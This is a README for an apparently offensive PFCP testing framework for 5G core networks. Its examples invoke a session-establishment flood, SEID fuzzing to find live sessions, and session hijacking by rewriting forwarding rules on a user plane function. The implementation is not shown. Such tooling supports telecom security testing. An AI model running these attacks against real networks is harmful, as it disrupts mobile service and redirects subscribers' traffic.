# PFCP Toolkit and Attack Framework

This project provides a set of tools and classes to interact with the PFCP (Packet Forwarding Control Protocol) in 5G core networks. It includes utilities for building and sending PFCP messages, as well as performing various attacks such as DoS, fuzzing, and hijacking.

## Table of Contents
- Overview
- Installation
- Classes and Methods
  - PFCPToolkit
  - PFCPDosAttack
  - PFCPFuzzer
  - PFCPHijack
- Examples
  - PFCP Association Setup
  - PFCP Session Establishment Flood
  - PFCP SEID Fuzzing
  - PFCP Hijack by FAR Manipulation

---

## Overview

This framework is designed for testing and simulating PFCP interactions in a 5G core network. It includes:
- **PFCPToolkit**: A utility class for building and sending PFCP messages.
- **PFCPDosAttack**: A class for performing DoS attacks using PFCP messages.
- **PFCPFuzzer**: A class for fuzzing PFCP parameters like SEIDs and FARs.
- **PFCPHijack**: A class for hijacking PFCP sessions by manipulating FARs.


---

## Classes and Methods

### PFCPToolkit

The `PFCPToolkit` class provides utilities for building and sending PFCP messages.

#### Features
- Build and send PFCP Association Setup Requests
- Build and send PFCP Session Establishment Requests
- Build and send PFCP Session Modification Requests (FAR updates)
- Build and send PFCP Session Deletion Requests
- Random SEID, TEID, Sequence support
- Logging, parameter handling, and verbose output

#### Methods
- `Build_PFCP_association_setup_req(...)`
- `Build_PFCP_session_establishment_req(...)`
- `Build_PFCP_session_modification_req(...)`
- `Build_PFCP_session_deletion_req(...)`
- `Send_PFCP_association_setup_req(...)`
- `Send_PFCP_session_establishment_req(...)`
- `Send_PFCP_session_modification_req(...)`
- `Send_PFCP_session_deletion_req(...)`
- `Random_create_far()`
- `Update_FAR(...)`

> See the class source file `pfcpToolkit.py` for full implementation and parameter details.

### PFCPDosAttack

Used to perform denial of service (DoS) attacks on a target PFCP-enabled node.

#### Methods
- `Start_pfcp_session_establishment_flood(...)`
- `Start_pfcp_session_deletion_bruteforce(...)`
- `Start_pfcp_session_deletion_targeted(...)`

### PFCPFuzzer

Used to discover valid session and FAR identifiers via fuzzing.

#### Methods
- `Start_PFCP_SEID_fuzzing(...)`
- `Start_PFCP_FARID_fuzzing(...)`

### PFCPHijack

Used to hijack PFCP sessions by modifying their FARs.

#### Methods
- `Start_PFCP_hijack_far_manipulation(...)`

---

## Examples

### PFCP Association Setup
```python
from pfcpToolkit import PFCPToolkit

toolkit = PFCPToolkit(src_addr="10.100.200.66", dest_addr="10.100.200.2", verbose=True)
toolkit.Send_PFCP_association_setup_req()
```

### PFCP Session Establishment Flood
```python
from pfcpDosAttack import PFCPDosAttack

dos = PFCPDosAttack(src_addr="10.100.200.66", dest_addr="10.100.200.2", verbose=True)
dos.Start_pfcp_session_establishment_flood(reqNbr=100, num_threads=5)
```

### PFCP SEID Fuzzing
```python
from pfcpFuzzer import PFCPFuzzer

fuzzer = PFCPFuzzer()
fuzzer.set_verbose(True)
fuzzer.Start_PFCP_SEID_fuzzing(
    upf_addr="10.100.200.2",
    src_addr="10.100.200.66",
    max_seid=1000,
    max_far_discover=10
)
```

### PFCP Hijack by FAR Manipulation
```python
from pfcpHijack import PFCPHijack

hijack = PFCPHijack()
hijack.set_verbose(True)
hijack.Start_PFCP_hijack_far_manipulation(
    hijacker_addr="10.100.200.66",
    upf_addr="10.100.200.2",
    seid=0xC0FFEE
)
```

---

## Notes
- Ensure you are running these scripts in a controlled environment for testing purposes only.
- Modify the IP addresses and ports as per your network setup.
- Use the `verbose=True` flag to enable detailed logging for debugging.

---

## License
This project is licensed under the MIT License. See the `LICENSE` file for details.

